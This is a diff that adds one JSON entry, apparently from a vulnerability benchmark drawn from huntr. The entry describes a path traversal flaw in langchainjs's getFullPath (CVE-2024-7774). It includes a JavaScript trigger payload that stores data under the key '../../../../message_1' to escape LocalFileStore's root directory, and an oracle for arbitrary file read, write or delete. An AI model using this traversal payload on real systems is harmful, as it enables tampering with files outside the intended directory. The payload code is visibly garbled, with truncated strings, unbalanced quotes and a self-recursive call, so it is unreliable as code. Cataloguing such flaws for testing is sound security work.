@@ -1,0 +1,15 @@
+{
+  "file_id": "879_langchain_huntr_8fe40685-b714-4191-af7a-3de5e5628cee",
+  "numeric_id": "879",
+  "library_hint": "langchain",
+  "source": "huntr",
+  "title": "Path traversal vulnerability in getFullPath function allows arbitrary file read, write, and delete operations",
+  "cve": "CVE-2024-7774",
+  "cwe": "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
+  "library": "langchainjs",
+  "affected_version": "== 0.2.5",
+  "vulnerable_function": "getFullPath",
+  "triggerability": "indirect",
+  "trigger_payload": "async function runExample() {\n// Initialize the store with a root directory\nconst store = await LocalFileStore.fromPath(\"./messages\");\n// Set multiple key-value pairs\nawait store.mset([\n[\"../../../../message_1\", new TextEncoder().encode(JSON.stringify({ type: \"AIMe\"))],\n[\"message_2\", new TextEncoder().encode(JSON.stringify({ type: \"HumanMessage\", c\"))],\n[\"message_3\", new TextEncoder().encode(JSON.stringify({ type: \"AIMessage\", cont\"))]\n]);\n// Retrieve messages by keys\nconst retrievedMessages = await store.mget([\"message:id:0\", \"message:id:1\", \"mess\"));\nconsole.log(retrievedMessages.map(v => new TextDecoder().decode(v)));\n// Call the async function to start execution\nrunExample().catch(err => console.error(err));\n}",
+  "oracle": "File created, read, or deleted at arbitrary locations in the filesystem"
+}
